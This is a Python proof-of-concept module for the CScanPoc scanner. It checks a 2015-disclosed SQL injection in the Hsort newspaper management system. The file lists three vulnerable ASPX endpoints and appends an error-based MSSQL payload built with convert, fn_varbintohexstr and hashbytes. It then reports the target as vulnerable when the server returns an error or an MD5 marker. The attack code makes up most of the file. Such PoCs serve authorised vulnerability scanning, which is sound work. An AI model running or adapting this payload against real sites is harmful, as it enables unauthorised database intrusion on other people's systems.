# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Hsort_0007'  # 平台漏洞编号，留空
    name = 'Hsort报刊管理系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-13'  # 漏洞公布时间
    desc = '''
        Hsort报刊管理系统SQL注入漏洞:
        "/BlackNews.aspx?papername=1&qnum=1&pagenum=1&id=1",
        "/BlackShow.aspx?paperName=1&qnum=1",
        "/admin/B/ajax/showB1.aspx?paperName=%2527",
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0113030'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hsort'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0b37c88d-4f8b-48ad-b27a-6afc3f9efd67'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                "/BlackNews.aspx?papername=1&qnum=1&pagenum=1&id=1",
                "/BlackShow.aspx?paperName=1&qnum=1",
                "/admin/B/ajax/showB1.aspx?paperName=%2527",
                # "getReault.aspx?paperName=1&bdate=01/01/2011&edate=01/01/2011&news=%2527",
                # "pagePiclist.aspx?qnum=129&pagenum=1&paperName=%2527",
            ]

            data = "(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--"
            for url in urls:
                vul = arg + url + data
                code, head, res, errcode, _ = hh.http(vul)
                if code == 500 or code == 200 and 'cc175b9c0f1b6a831c399e269772661' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
